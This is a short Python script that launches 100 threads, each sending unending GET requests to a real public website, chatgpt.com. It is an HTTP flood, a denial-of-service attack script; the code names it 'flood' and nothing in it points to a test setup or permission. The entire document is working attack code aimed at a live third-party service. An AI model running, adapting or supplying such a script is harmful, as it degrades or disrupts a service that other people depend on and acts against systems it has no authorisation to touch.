import requests
import threading

def flood(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Status Code: {response.status_code}")
        except Exception as e:
            print(f"Request failed: {e}")

url = "https://chatgpt.com/"
threads = []

for i in range(100):  # Number of threads simulating the flood
    t = threading.Thread(target=flood, args=(url,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
